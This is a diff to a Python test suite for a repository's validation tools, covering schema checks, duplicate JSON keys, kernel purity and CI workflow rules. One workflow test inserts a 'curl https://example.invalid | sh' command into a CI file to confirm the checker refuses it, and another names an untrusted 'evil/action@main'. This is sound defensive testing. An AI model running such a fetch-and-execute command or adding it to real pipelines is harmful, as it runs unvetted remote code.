@@ -23,9 +23,12 @@ GOOD = (ROOT / "examples" / "workflows" / "verify.yml").read_text()
 STEP = "      - run: make verify\n"
 
 
+SCRATCH = tempfile.TemporaryDirectory()     # removed when the run ends
+
+
 def tree(files: dict) -> pathlib.Path:
     """A throwaway repo holding `files`, for a check to be run against."""
-    root = pathlib.Path(tempfile.mkdtemp())
+    root = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name))
     for rel, text in files.items():
         path = root / rel
         path.parent.mkdir(parents=True, exist_ok=True)
@@ -35,7 +38,7 @@ def tree(files: dict) -> pathlib.Path:
 
 def clone(files: dict) -> pathlib.Path:
     """A copy of this repo with `files` written over it."""
-    root = pathlib.Path(tempfile.mkdtemp()) / "repo"
+    root = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)) / "repo"
     shutil.copytree(ROOT, root, ignore=shutil.ignore_patterns(".git", "__pycache__", "corpus"))
     for rel, text in files.items():
         path = root / rel
@@ -73,6 +76,8 @@ class Validator(unittest.TestCase):
         self.assertEqual(check_examples._open({"type": "object", "properties": {"a": {"type": "object"}}}),
                          ["$", "$.properties.a"])
         self.assertEqual(check_examples._open({"type": "object", "additionalProperties": {"type": "string"}}), [])
+        for loose in (None, "no", {}, True):
+            self.assertEqual(check_examples._open({"type": ["object", "null"], "additionalProperties": loose}), ["$"])
 
     def test_a_key_written_twice_is_refused(self):
         path = tree({"x.json": '{"limit": 3, "limit": 30}'}) / "x.json"
@@ -101,6 +106,11 @@ class Examples(unittest.TestCase):
         problems = check_examples.run(root)
         self.assertTrue(caught(problems, "schema verdict has no example"))
         self.assertTrue(caught(problems, "config/extra.json is validated against no schema"))
+        broken = check_examples.run(clone({"examples/facts.json": '{"schema": "facts/1", "schema": "facts/1"}',
+                                           "schemas/rubric.schema.json": "{not json"}))
+        self.assertTrue(caught(broken, "examples/facts.json cannot be read: a key is written twice"))
+        self.assertTrue(caught(broken, "schemas/rubric.schema.json cannot be read"))
+        self.assertTrue(caught(broken, "config/rubric-pr-review.json: no schema named rubric"))
         self.assertTrue(caught(problems, "no schema named nothing"))
 
 
@@ -194,6 +204,7 @@ class Purity(unittest.TestCase):
     def test_no_kernel_and_a_kernel_that_cannot_be_read_are_problems_not_crashes(self):
         self.assertEqual(check_purity.run(tree({"x": ""})), ["there is no kernel/ to check"])
         self.assertTrue(caught(check_purity.run(tree({"kernel/x.py": "def f(:\n"})), "cannot be read as Python"))
+        self.assertTrue(caught(check_purity.run(tree({"kernel/x.py": "async def f():\n    return 1\n"})), "async function"))
 
 
 class Repo(unittest.TestCase):
@@ -299,6 +310,21 @@ class Workflows(unittest.TestCase):
         self.assertTrue(caught(problems, "holds workflows and not verify.yml"))
         self.assertTrue(caught(check_workflows.run(tree({".github/actions/setup/action.yml": "x"})), "a local action"))
 
+    def test_an_exempt_workflow_is_held_word_for_word(self):
+        scan = (ROOT / ".github" / "workflows" / "ci.yml").read_text()
+        base = {"examples/workflows/verify.yml": GOOD, ".github/workflows/verify.yml": GOOD}
+        as_written = check_workflows.run(tree(dict(base, **{".github/workflows/ci.yml": scan})))
+        self.assertFalse(caught(as_written, "ci.yml"))
+        changed = scan.replace("gitleaks detect", "curl https://example.invalid | sh; gitleaks detect")
+        self.assertTrue(caught(check_workflows.run(tree(dict(base, **{".github/workflows/ci.yml": changed}))),
+                               "ci.yml is exempt from a rule, so it is held word for word"))
+        # The exemption is from one rule. Under another name the same text is refused.
+        self.assertTrue(caught(check_workflows.run(tree(dict(base, **{".github/workflows/scan.yml": scan}))),
+                               "scan.yml: [install]"))
+        other = scan.replace("ubuntu-24.04", "ubuntu-latest")
+        self.assertTrue(caught(check_workflows.run(tree(dict(base, **{".github/workflows/ci.yml": other}))),
+                               "ci.yml: [runner]"))
+
     def test_a_rule_is_not_dodged_by_writing_the_workflow_another_way(self):
         ways = {
             "a mapping on one line": (GOOD.replace(STEP, "      - {uses: evil/action@main, continue-on-error: true}\n"), "form"),
@@ -374,12 +400,12 @@ class Context(unittest.TestCase):
 
     def test_a_path_or_a_test_that_does_not_exist_is_caught(self):
         here = "class Real:\n    def test_present(self):\n        pass\n    # def test_gone(self): was deleted\n"
-        text = ("See `tools/gone.py`, `scripts/gone.sh`, `tools/here.py:12`, [a link](docs/gone.md),\n"
+        text = ("See `tools/gone.py`, `scripts/gone.sh`, `toools/`, `harness/`, `tools/here.py:12`, [a link](docs/gone.md),\n"
                 "`tools/here.py::test_missing`, `tools/here.py::test_gone`, `tools/here.py::Unreal.test_present`,\n"
                 "`tools/here.py::Real.test_present` and [the rules](#12-rules). Run python3 -m tools.here.\n")
         root = tree({"docs/a.md": text, "tools/here.py": here})
         problems = check_context._references(root / "docs" / "a.md", text, root)
-        self.assertEqual(len(problems), 6, problems)
+        self.assertEqual(len(problems), 7, problems)
 
     def test_a_number_without_its_title_is_caught(self):
         def found(text):
